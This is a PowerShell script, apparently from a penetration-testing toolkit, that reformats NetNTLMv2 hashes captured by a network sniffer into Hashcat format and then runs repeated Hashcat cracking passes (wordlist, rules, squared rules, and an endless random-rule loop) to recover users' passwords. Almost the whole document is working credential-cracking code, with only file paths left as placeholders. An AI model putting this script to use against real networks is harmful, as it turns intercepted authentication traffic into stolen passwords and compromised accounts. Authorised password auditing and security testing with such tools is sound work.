$XMLInputPath = "<Path to the output XML created by the sniffer>"
$HashcatHashOutputPath = "<Path where you want the Hashcat formatted hashes dumped>"

$Results = foreach($ResultObject in @(([xml](Get-Content $XMLInputPath)).ResultObjects.ResultObject.GetEnumerator())) {
  "{0}::{1}:{2}:{3}" -F $ResultObject.UserName.ToUpper(), $ResultObject.ClientDomainName.ToUpper(), $ResultObject.ServerChallenge.ToLower(), $ResultObject.NtChallengeString.ToLower()
}
$Results | Out-File -FilePath $HashcatHashOutputPath -Encoding ascii

return

$CrackedList = "<Path to where you want any cracked hashes>"
$HashcatBinary = "<Path to Hashcat binary>"
$HashList = $HashcatHashOutputPath
$HashType = 5600
$RulesList = "<Path to Hashcat rules file>"
$RulesLog = "<Path to log successful Hashcat rules>"
$SessionName = "NetNTLMv2Hashes"
$WordList = "<Path to wordlist>"

# Run straight wordlist against the hashes.
& $HashcatBinary --status -w 3 --session $SessionName -o $CrackedList --outfile-format=3 --potfile-disable --remove -a 0 -O -m $HashType $HashList $WordList

# Run the supplied wordlist with the supplied rules against the hashes.
& $HashcatBinary --status -w 3 --session $SessionName -o $CrackedList --outfile-format=3 --potfile-disable --remove -a 0 -O --debug-mode=1 --debug-file=$RulesLog -r $RulesList -m $HashType $HashList $WordList

# Run the supplied wordlist with the supplied rules, squared, against the hashes.
& $HashcatBinary --status -w 3 --session $SessionName -o $CrackedList --outfile-format=3 --potfile-disable --remove -a 0 -O --debug-mode=1 --debug-file=$RulesLog -r $RulesList -r $RulesList -m $HashType $HashList $WordList

# Run random rules on the wordlist, limited to 7 days of run time, forever.
while($true) {
    & $HashcatBinary --status -w 3 --session $SessionName -o $CrackedList --outfile-format=3 --potfile-disable --remove -a 0 -O --generate-rules=1000000 --generate-rules-func-min=5 --runtime=604800 --generate-rules-func-max=25 --debug-mode=1 --debug-file=$RulesLog -m $HashType $HashList $WordList
}
